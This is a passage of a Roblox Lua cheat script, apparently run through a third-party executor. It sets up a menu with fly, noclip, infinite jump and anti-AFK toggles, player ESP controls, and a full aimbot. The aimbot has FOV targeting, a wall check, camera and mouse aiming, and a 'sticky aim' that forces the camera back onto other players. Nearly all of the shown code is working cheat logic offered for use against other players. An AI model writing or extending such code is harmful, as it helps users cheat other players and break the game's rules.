		Flag = "FlySpeed_Flag"
	}}
})

-- Fly Toggle
UtilityTab:Toggle({
	Title = "Fly",
	CurrentValue = false,
    Config = true,
	Flag = "Fly_Flag",
	CallBack = function(Value)
		if Value then
			if startFly then startFly() end
		else
			if stopFly then stopFly() end
		end
	end
})

-- Infinite Jump Toggle (SETS THE VARIABLE)
UtilityTab:Toggle({
    Title = "Infinite Jump", 
    CurrentValue = false, 
    Flag = "IJ_Flag", 
    CallBack = function(Value)
    end
})

-- Noclip Toggle (SETS THE VARIABLE)
UtilityTab:Toggle({
    Title = "Noclip", 
    CurrentValue = false, 
    Flag = "NC_Flag", 
    CallBack = function(Value)
    end
})

-- Anti Afk Toggle (Prevents you from being kicked for being idle)
local afkConnection = nil  -- Store the connection so we can disconnect it

UtilityTab:Toggle({
    Title = "Anti-AFK",
    CurrentValue = false,
    Flag = "AFK_Flag",
    CallBack = function(Value)
        if Value then
            -- Only create connection if it doesn't exist
            if not afkConnection then
                local VirtualUser = game:GetService("VirtualUser")
                afkConnection = game:GetService("Players").LocalPlayer.Idled:Connect(function()
                    VirtualUser:ClickButton2(Vector2.new())
                    print("üîÑ Anti-AFK triggered - Simulated activity")
                end)
                print("‚úÖ Anti-AFK enabled")
            end
        else
            -- Disconnect when toggled off
            if afkConnection then
                afkConnection:Disconnect()
                afkConnection = nil
                print("‚ùå Anti-AFK disabled")
            end
        end
    end
})

-- Reset All Movement Button (UPDATED)
UtilityTab:Button({
    Title = "Reset All Movement",
    CallBack = function()
        -- 1. Reset UI (Toggles/Sliders)
        SpeedSlider:Set(16)
        JumpSlider:Set(50)
        syde.Flags.FlySpeed_Flag:Set(50)
        
        -- 2. Reset toggle variables
        if syde.Flags.IJ_Flag then 
            syde.Flags.IJ_Flag:Set(false)
            infiniteJumpEnabled = false  -- Add this
        end
        if syde.Flags.NC_Flag then 
            syde.Flags.NC_Flag:Set(false)
            noclipEnabled = false  -- Add this
        end
        
        -- 3. Fly Support: Turn off Toggle and Kill Physics
        if syde.Flags.Fly_Flag then 
            syde.Flags.Fly_Flag:Set(false)
            if stopFly then stopFly() end
        end
        
        -- 4. Immediate Character Reset
        local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
        if hum then
            hum.WalkSpeed = 16
            hum.JumpPower = 50
            hum.PlatformStand = false
            hum:ChangeState(Enum.HumanoidStateType.GettingUp)
        end
    end
})

-- ==================== PRO-GRADE LOGIC ENGINE ====================
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local LP = game.Players.LocalPlayer

-- Noclip Logic (FIXED - using .Value)
RunService.Stepped:Connect(function()
    if syde.Flags.NC_Flag and syde.Flags.NC_Flag.Value then  -- Changed to .Value
        if LP.Character then
            for _, v in pairs(LP.Character:GetDescendants()) do
                if v:IsA("BasePart") then v.CanCollide = false end
            end
        end
    end
end)

-- Anti-Reset Logic (Re-applies your settings when you respawn)
LP.CharacterAdded:Connect(function(char)
    local hum = char:WaitForChild("Humanoid")
    task.wait(0.6) 
    
    if syde.Flags.WS_Flag then
        -- Sliders might use .CurrentValue still, but let's be safe
        hum.WalkSpeed = syde.Flags.WS_Flag.Value or syde.Flags.WS_Flag.CurrentValue or 16
    end
    if syde.Flags.JP_Flag then
        hum.UseJumpPower = true
        hum.JumpPower = syde.Flags.JP_Flag.Value or syde.Flags.JP_Flag.CurrentValue or 50
    end
end)

-- Infinite Jump Logic (FIXED - using .Value)
UserInputService.JumpRequest:Connect(function()
    if syde.Flags.IJ_Flag and syde.Flags.IJ_Flag.Value then  -- Changed to .Value
        local hum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
        if hum then 
            hum:ChangeState(Enum.HumanoidStateType.Jumping)
        end
    end
end)

-- System Management Section
UtilityTab:Section('System Management')  -- FIXED

-- Refresh ESP Button
UtilityTab:Button({
    Title = "Refresh ESP",
    CallBack = function()
        for player, data in pairs(espData) do
            if data and data.highlight then data.highlight:Destroy() end
            if data and data.billboard then data.billboard:Destroy() end
        end
        espData = {}
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                task.spawn(function() createESP(player) end)
            end
        end
    end
})

-- Destroy UI Button
UtilityTab:Button({
    Title = "Destroy UI",
    CallBack = function()
        for player, data in pairs(espData) do
            if data and data.highlight then data.highlight:Destroy() end
            if data and data.billboard then data.billboard:Destroy() end
        end
        espData = {}
        syde:Destroy()
    end
})

-- Debug Button
UtilityTab:Button({
    Title = "Debug Info",
    CallBack = function()
        print("[ESP DEBUG] ================")
        print("ESP Enabled:", ESP_SETTINGS.ENABLED)
        
        local espCount = 0
        for _ in pairs(espData) do espCount = espCount + 1 end
        print("Players with ESP data:", espCount)
        print("Total players in game:", #Players:GetPlayers())
        
        syde:Notify({
            Title = "ESP Debug",
            Content = string.format("ESP: %s | Active: %d/%d", 
                ESP_SETTINGS.ENABLED and "ON" or "OFF", 
                espCount, 
                #Players:GetPlayers()),
            Duration = 5
        })
    end
})

-- ==================== AIMBOT SYSTEM ====================
local AimbotTab = Window:InitTab({
    Title = "Aimbot"
})

-- Helper function to clamp values (prevents extreme values)
local function clamp(value, min, max)
    return math.max(min, math.min(max, value))
end

-- Aimbot Settings Section
AimbotTab:Section('Aimbot Settings')

-- Aimbot Master Toggle
local aimbotMasterEnabled = false
AimbotTab:Toggle({
    Title = "Aimbot Enabled",
    CurrentValue = false,
    Flag = "Aimbot_Enabled",
    CallBack = function(Value)
        aimbotMasterEnabled = Value
        print("üî´ Aimbot System:", Value and "ON" or "OFF")
    end
})

-- Aimbot Key Selection (Drop-down instead of Keybind - MORE RELIABLE)
local aimbotKey = Enum.KeyCode.LeftShift
local currentTarget = nil  -- For sticky aim
local keyNames = {
    "LeftShift", "RightShift", "LeftControl", "RightControl", "LeftAlt", "RightAlt",
    "E", "Q", "F", "G", "R", "T", "Y", "U", "I", "O", "P",
    "A", "S", "D", "F", "G", "H", "J", "K", "L",
    "Z", "X", "C", "V", "B", "N", "M",
    "One", "Two", "Three", "Four", "Five", "Six", "Seven", "Eight", "Nine", "Zero",
    "MouseButton1", "MouseButton2", "MouseButton3"
}

AimbotTab:Dropdown({
    Title = "Aimbot Key",
    Options = keyNames,
    CurrentOption = {"LeftShift"},
    Multi = false,
    Flag = "AimbotKeySelect",
    CallBack = function(option)
        local keyName = type(option) == "table" and option[1] or option
        -- Convert string to Enum.KeyCode
        local success, enumKey = pcall(function()
            return Enum.KeyCode[keyName]
        end)
        if success and enumKey then
            aimbotKey = enumKey
            print("üîë Aimbot key set to:", keyName)
        else
            print("‚ö†Ô∏è Invalid key, using LeftShift")
            aimbotKey = Enum.KeyCode.LeftShift
        end
    end
})

-- Keybind Mode Dropdown
local aimbotMode = "Hold Key"
AimbotTab:Dropdown({
    Title = "Activation Mode",
    Options = {"Hold Key", "Toggle Key", "Always On"},
    CurrentOption = {"Hold Key"},
    Multi = false,
    Flag = "AimbotMode",
    CallBack = function(option)
        aimbotMode = type(option) == "table" and option[1] or option
        print("Aimbot mode set to:", aimbotMode)
    end
})

-- Aim Method Dropdown
local aimMethod = "Camera"
AimbotTab:Dropdown({
    Title = "Aim Method",
    Options = {"Camera", "Mouse", "CFrame"},
    CurrentOption = {"Camera"},
    Multi = false,
    Flag = "AimMethod",
    CallBack = function(option)
        aimMethod = type(option) == "table" and option[1] or option
    end
})

-- Target Part Dropdown
local targetPart = "Head"
AimbotTab:Dropdown({
    Title = "Target Part",
    Options = {"Head", "HumanoidRootPart", "Torso", "UpperTorso", "LowerTorso", "Random"},
    CurrentOption = {"Head"},
    Multi = false,
    Flag = "TargetPart",
    CallBack = function(option)
        targetPart = type(option) == "table" and option[1] or option
    end
})

-- Aim Speed Slider
local aimSpeed = 20
AimbotTab:CreateSlider({
    Title = "Aim Speed",
    Sliders = {{
        Title = "Smoothness",
        Range = {1, 100},
        Increment = 1,
        StarterValue = 20,
        CallBack = function(Value)
            aimSpeed = Value
        end,
        Flag = "AimSpeed"
    }}
})

-- FOV Size Slider
local fovSize = 150
AimbotTab:CreateSlider({
    Title = "FOV Size",
    Sliders = {{
        Title = "Radius",
        Range = {50, 500},
        Increment = 5,
        StarterValue = 150,
        CallBack = function(Value)
            fovSize = Value
            if fovCircle then
                fovCircle.Radius = Value
            end
        end,
        Flag = "FOVSize"
    }}
})

-- FOV Toggle
local fovEnabled = false
AimbotTab:Toggle({
    Title = "Show FOV Circle",
    CurrentValue = false,
    Flag = "FOV_Toggle",
    CallBack = function(Value)
        fovEnabled = Value
        if fovCircle then
            fovCircle.Visible = Value
            print("FOV Circle:", Value and "Visible" or "Hidden")
        end
    end
})

-- FOV Color Picker
local fovColor = Color3.fromRGB(255, 255, 255)
AimbotTab:ColorPicker({
    Title = "FOV Color",
    Color = Color3.fromRGB(255, 255, 255),
    Flag = "FOV_Color",
    CallBack = function(Value)
        fovColor = Value
        if fovCircle then
            fovCircle.Color = Value
        end
    end
})

-- Team Check Toggle
local ignoreTeammates = true
AimbotTab:Toggle({
    Title = "Ignore Teammates",
    CurrentValue = true,
    Flag = "IgnoreTeammates",
    CallBack = function(Value)
        ignoreTeammates = Value
    end
})

-- Wall Check Toggle
local wallCheck = false
AimbotTab:Toggle({
    Title = "Wall Check",
    CurrentValue = false,
    Flag = "WallCheck",
    CallBack = function(Value)
        wallCheck = Value
    end
})

-- STICKY AIM TOGGLE
local stickyAim = true
AimbotTab:Toggle({
    Title = "Sticky Aim (Lock onto target)",
    CurrentValue = true,
    Flag = "StickyAim",
    CallBack = function(Value)
        stickyAim = Value
        if not Value then
            currentTarget = nil  -- Clear target when sticky is off
        end
        print("Sticky Aim:", Value and "ON" or "OFF")
    end
})

-- Sticky Aim Strength (EXTRA STRONG - FIGHTS BACK AGAINST FLICKS!)
local stickyStrength = 0.99  -- Default to 99% (ALMOST IMPOSSIBLE TO BREAK)
AimbotTab:CreateSlider({
    Title = "Sticky Aim Strength",
    Sliders = {{
        Title = "Resistance %",
        Range = {80, 100},  -- Minimum 80%, max 100% for ULTRA sticky
        Increment = 1,
        StarterValue = 100,
        CallBack = function(Value)
            stickyStrength = Value / 100  -- Convert to decimal (0.99)
            print("Sticky Strength set to:", Value, "%")
        end,
        Flag = "StickyStrength"
    }}
})

-- ==================== AIMBOT CORE LOGIC ====================
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local LP = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- Keybind state tracking
local keyPressed = false
local aimbotActive = false
local currentTarget = nil  -- For sticky aim

-- CREATE FOV CIRCLE PROPERLY (centered on mouse)
local fovCircle = Drawing.new("Circle")
fovCircle.Visible = false
fovCircle.Thickness = 2
fovCircle.NumSides = 60
fovCircle.Radius = fovSize
fovCircle.Color = fovColor
fovCircle.Filled = false
fovCircle.Transparency = 1
fovCircle.Position = Vector2.new(500, 300) -- Default position
print("‚úÖ FOV Circle created (will follow mouse)")

-- Update FOV Circle position and properties (NOW FOLLOWS MOUSE!)
RunService.RenderStepped:Connect(function()
    if fovCircle then
        -- Get mouse position for FOV circle to follow
        local mousePos
        local success, result = pcall(function()
            return UserInputService:GetMouseLocation()
        end)
        
        if success and result then
            mousePos = result
        else
            -- Fallback to screen center if mouse position fails
            mousePos = Camera.ViewportSize / 2
        end
        
        -- Update circle properties
        fovCircle.Position = mousePos  -- Circle follows mouse!
        fovCircle.Radius = fovSize
        fovCircle.Color = fovColor
        fovCircle.Visible = fovEnabled
    end
end)

-- Keybind handler (using dropdown key)
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    
    -- Check if the input matches our selected key
    if input.KeyCode == aimbotKey then
        keyPressed = true
        
        if aimbotMode == "Hold Key" then
            aimbotActive = true
            print("üéØ Aimbot ACTIVE (holding key)")
        elseif aimbotMode == "Toggle Key" then
            aimbotActive = not aimbotActive
            if not aimbotActive then
                currentTarget = nil  -- Clear target when toggled off
            end
            print("üéØ Aimbot:", aimbotActive and "TOGGLED ON" or "TOGGLED OFF")
        end
    end
end)

UserInputService.InputEnded:Connect(function(input, gameProcessed)
    if input.KeyCode == aimbotKey and aimbotMode == "Hold Key" then
        keyPressed = false
        aimbotActive = false
        currentTarget = nil  -- Clear target when key released
        print("üéØ Aimbot DEACTIVATED (key released)")
    end
end)

-- Function to check if aimbot should currently aim
local function shouldAim()
    -- Master toggle must be on
    if not aimbotMasterEnabled then 
        return false 
    end
    
    -- Check based on mode
    if aimbotMode == "Always On" then
        return true
    else
        return aimbotActive
    end
end

-- Function to check if player is valid target
local function isValidTarget(player)
    if not player or player == LP then 
        return false 
    end
    if not player.Character then 
        return false 
    end
    
    local character = player.Character
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if not humanoid or humanoid.Health <= 0 then 
        return false 
    end
    
    -- Team check
    if ignoreTeammates and player.Team and LP.Team then
        if player.Team == LP.Team then 
            return false 
        end
    end
    
    return true
end

-- Function to get target part
local function getTargetPart(character)
    local part = targetPart or "Head"
    
    if part == "Random" then
        local parts = {"Head", "HumanoidRootPart", "Torso", "UpperTorso", "LowerTorso"}
        part = parts[math.random(1, #parts)]
    end
    
    local target = character:FindFirstChild(part)
    if not target then
        target = character:FindFirstChild("Head") 
        if not target then
            target = character:FindFirstChild("HumanoidRootPart")
        end
    end
    
    return target
end

-- Function to check visibility
local function isVisible(targetPart)
    if not wallCheck then return true end
    
    local origin = Camera.CFrame.Position
    local target = targetPart.Position
    local direction = (target - origin).Unit
    local ray = Ray.new(origin, direction * 1000)
    local hit, position = workspace:FindPartOnRay(ray, LP.Character)
    
    return hit and hit:IsDescendantOf(targetPart.Parent)
end

-- Function to get closest target (with STICKY AIM support)
local function getClosestTarget()
    -- Get mouse position first (used throughout)
    local mousePos
    local success, result = pcall(function()
        return UserInputService:GetMouseLocation()
    end)
    
    if success and result then
        mousePos = result
    else
        mousePos = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)
    end
    
    -- If sticky aim is enabled and we have a current target, check if it's still valid
    if stickyAim and currentTarget then
        if isValidTarget(currentTarget) then
            local targetPartObj = getTargetPart(currentTarget.Character)
            if targetPartObj then
                -- Check if still in FOV (using mouse position)
                local screenPoint, onScreen = Camera:WorldToViewportPoint(targetPartObj.Position)
                if onScreen then
                    local distance = (Vector2.new(screenPoint.X, screenPoint.Y) - mousePos).Magnitude
                    
                    -- If still in FOV and visible, keep current target (use larger FOV for sticky)
                    if distance <= fovSize * 1.5 then  -- 50% larger FOV for sticky retention
                        if wallCheck then
                            if isVisible(targetPartObj) then
                                return currentTarget
                            end
                        else
                            return currentTarget
                        end
                    end
                end
            end
        end
        -- If current target is no longer valid, clear it
        currentTarget = nil
    end
    
    -- Find new target
    local closestPlayer = nil
    local shortestDistance = fovSize
    local playersInFOV = 0
    
    -- Loop through all players
    for _, player in ipairs(Players:GetPlayers()) do
        -- Check if player is valid
        if isValidTarget(player) then
            local character = player.Character
            if character then
                local targetPartObj = getTargetPart(character)
                
                if targetPartObj then
                    -- Convert world position to screen position
                    local screenPoint, onScreen = Camera:WorldToViewportPoint(targetPartObj.Position)
                    
                    if onScreen then
                        -- Calculate distance from MOUSE to target on screen
                        local distance = (Vector2.new(screenPoint.X, screenPoint.Y) - mousePos).Magnitude
                        
                        -- Check if within FOV
                        if distance <= fovSize then
                            playersInFOV = playersInFOV + 1
                            
                            -- Check visibility if enabled
                            local visible = true
                            if wallCheck then
                                visible = isVisible(targetPartObj)
                            end
                            
                            -- If visible and closer than current target, select it
                            if visible and distance < shortestDistance then
                                shortestDistance = distance
                                closestPlayer = player
                            end
                        end
                    end
                end
            end
        end
    end
    
    -- Set new target if found
    if closestPlayer then
        currentTarget = closestPlayer
        if playersInFOV > 0 then
            print("üéØ Target acquired:", closestPlayer.Name, "Distance:", math.floor(shortestDistance))
        end
    end
    
    return closestPlayer
end

-- Main Aimbot Loop (with ULTRA STRONG sticky aim that WON'T LET GO!)
RunService.RenderStepped:Connect(function()
    -- Only aim if shouldAim() returns true
    if not shouldAim() then 
        return 
    end
    
    local target = getClosestTarget()
    if not target then 
        return 
    end
    
    local targetPartObj = getTargetPart(target.Character)
    if not targetPartObj then 
        return 
    end
    
    -- Check wall again for safety
    if wallCheck then
        local visible = isVisible(targetPartObj)
        if not visible then 
            -- If sticky aim is on, try to reacquire for a few frames before giving up
            if stickyAim and currentTarget then
                for i = 1, 5 do
                    task.wait()
                    visible = isVisible(targetPartObj)
                    if visible then break end
                end
            end
            if not visible then
                return 
            end
        end
    end
    
    -- Aim at target
    local targetPos = targetPartObj.Position
    local cameraPos = Camera.CFrame.Position
    
    if aimMethod == "Camera" then
        -- Smooth camera aim with ULTRA STRONG sticky
        local currentCFrame = Camera.CFrame
        local targetCFrame = CFrame.lookAt(cameraPos, targetPos)
        
        -- If sticky aim is on, make it IMPOSSIBLE to move away
        if stickyAim and currentTarget then
            -- CONTINUOUSLY force back to target (every frame, multiple times)
            for i = 1, 5 do  -- 5 pulls per frame for MAXIMUM stickiness
                Camera.CFrame = Camera.CFrame:Lerp(targetCFrame, stickyStrength)
                task.wait()
            end
            -- Extra snap every few frames
            if tick() % 0.1 < 0.01 then
                Camera.CFrame = targetCFrame  -- Full snap occasionally
            end
        else
            -- Normal smooth aim
            local smoothness = aimSpeed / 100
            Camera.CFrame = currentCFrame:Lerp(targetCFrame, smoothness)
        end
        
    elseif aimMethod == "Mouse" then
        -- Move mouse to target (FIXED - NO MORE SPINNING!)
        local screenPoint = Camera:WorldToViewportPoint(targetPos)
        if screenPoint then
            -- Calculate how far the target is from screen center
            local targetX = screenPoint.X - Camera.ViewportSize.X/2
            local targetY = screenPoint.Y - Camera.ViewportSize.Y/2
            
            -- Limit the movement amount to prevent spinning
            local maxMove = 20  -- Maximum pixels per frame
            local moveX = clamp(targetX * (aimSpeed/200), -maxMove, maxMove)
            local moveY = clamp(targetY * (aimSpeed/200), -maxMove, maxMove)
            
            -- If sticky aim is on, apply extra pulls
            if stickyAim and currentTarget then
                -- Gentle pulls toward target (not full force)
                for i = 1, 3 do
                    mousemoverel(moveX * 0.5, moveY * 0.5)  -- Half strength to prevent overspin
                    task.wait()
                end
            else
                mousemoverel(moveX, moveY)
            end
        end
        
    elseif aimMethod == "CFrame" then
        -- Instant CFrame aim (this already sticks 100%)
        Camera.CFrame = CFrame.lookAt(cameraPos, targetPos)
    end
end)

AimbotTab:Label("üìå Select your key from the dropdown above", "Left")

-- Initialize ESP after UI is created
task.wait(3) -- Give UI time to load
initializeESP()

-- Put this at the VERY BOTTOM of your script
syde:LoadSaveConfig()

-- THIS FIXES THE DROPDOWN SAVING
task.wait(0.5) -- Give it a moment to load
if syde.Flags.NameModeDropdown and syde.Flags.NameModeDropdown.Value then
    ESP_SETTINGS.NAME_MODE = syde.Flags.NameModeDropdown.Value
    print("‚úÖ Loaded NAME_MODE from config:", ESP_SETTINGS.NAME_MODE)
end

print("‚úÖ Hallow Interface with ESP loaded successfully!")
